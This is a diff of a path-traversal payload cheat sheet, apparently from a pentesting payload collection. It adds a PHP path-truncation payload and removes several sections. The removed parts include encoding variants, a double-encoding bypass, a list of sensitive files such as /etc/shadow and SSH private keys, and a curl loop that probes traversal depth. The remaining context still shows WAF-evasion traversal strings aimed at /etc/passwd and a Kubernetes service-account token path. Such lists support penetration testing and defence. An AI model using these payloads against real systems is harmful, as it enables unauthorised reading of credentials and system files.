@@ -21,16 +21,6 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 ## Encoding Variants
 
-### URL Encoding
-
-```
-%2e%2e%2f        = ../
-%2e%2e%5c        = ..\
-%2e%2e/          = ../
-..%2f            = ../
-..%5c            = ..\
-```
-
 ### Double URL Encoding
 
 ```
@@ -61,13 +51,13 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 Works on older PHP (< 5.3.4), older Java, and some other runtimes.
 
+```
+# Path truncation (4096+ chars, PHP < 5.3)
+../../../etc/passwd/./././././.[repeat to 4096+ chars]
+../../../etc/passwd............[repeat to 4096+ chars]
+```
+
 ## Traversal Pattern Bypasses
-
-### Double Encoding Bypass
-
-```
-..%252f..%252f..%252fetc%252fpasswd
-```
 
 ### Filter Evasion (Recursive Stripping)
 
@@ -103,25 +93,12 @@ Works on older PHP (< 5.3.4), older Java, and some other runtimes.
 
 ```
 /etc/passwd
-/etc/shadow
-/etc/hosts
-/etc/hostname
-/etc/issue
-/etc/resolv.conf
-/etc/crontab
 /proc/self/environ
 /proc/self/cmdline
 /proc/self/cwd/
 /proc/self/fd/0
 /proc/version
 /proc/net/tcp
-/var/log/apache2/access.log
-/var/log/auth.log
-/home/[user]/.ssh/id_rsa
-/home/[user]/.ssh/authorized_keys
-/home/[user]/.bash_history
-/root/.ssh/id_rsa
-/root/.bash_history
 /run/secrets/kubernetes.io/serviceaccount/token
 ```
 
@@ -142,30 +119,10 @@ C:\Users\[user]\.ssh\id_rsa
 ## WAF Bypass Patterns
 
 ```
-# Mangled double traversal
-..././..././
-...\.\...\.\
-
-# Path normalization tricks
-/etc/./passwd
-/etc/../etc/passwd
-/etc/passwd/.
-
 # URL encoding + traversal
 ..%c0%af..%c0%af..%c0%afetc/passwd
 ..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
 
 # Windows UNC
 \\localhost\c$\windows\win.ini
-```
-
-## Automated Testing
-
-```bash
-# curl-based traversal test
-for i in $(seq 1 10); do
-  PAYLOAD=$(python3 -c "print('../'*$i + 'etc/passwd')")
-  echo "Testing depth $i: $PAYLOAD"
-  curl -s "http://target/read?file=$PAYLOAD" | head -1
-done
 ```
